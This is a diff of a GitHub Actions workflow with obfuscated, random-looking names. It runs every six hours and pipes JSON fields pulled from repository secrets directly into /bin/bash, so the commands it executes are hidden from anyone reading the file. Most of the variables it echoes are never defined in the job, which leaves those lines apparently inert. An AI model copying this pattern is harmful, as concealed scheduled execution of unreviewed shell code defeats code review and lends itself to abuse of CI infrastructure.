@@ -1,25 +1,26 @@
 name: caozhang19870101
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
+    - cron: '58 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caozhang19870101
         env:
-          b6: ${{ secrets.b6 }}
+          zxz133: ${{ secrets.zxz133 }}
         run: |
-          echo $b6 | jq -r .cpwq3939 | /bin/bash
-          echo $xqxz7878 | jq -r .d402 | /bin/bash
-          echo $msto1787 | jq -r .hk1348 | /bin/bash
-          echo $he30268 | jq -r .yilye20852 | /bin/bash
-          echo $qshby624 | jq -r .y15 | /bin/bash
-          echo $fbasn35692 | jq -r .pv20125 | /bin/bash
-          echo $ywxz08964 | jq -r .d50662 | /bin/bash
-          echo $jsol1 | jq -r .drch0028 | /bin/bash
-          echo $d045 | jq -r .eemi59 | /bin/bash
+          echo $zxz133 | jq -r .mr9 | /bin/bash
+          echo $ajer476 | jq -r .tzwh686 | /bin/bash
+          echo $vakxh774 | jq -r .u0433 | /bin/bash
+          echo $qeen156 | jq -r .rye5879 | /bin/bash
+          echo $lqjam2036 | jq -r .wa3247 | /bin/bash
+          echo $qqob723 | jq -r .uva537 | /bin/bash
+          echo $p64395 | jq -r .eey8984 | /bin/bash
+          echo $oiiql18009 | jq -r .kqcw46255 | /bin/bash
+          echo $folk7579 | jq -r .wwwk6710 | /bin/bash
+          echo $gqtlg9349 | jq -r .ugh8133 | /bin/bash
 
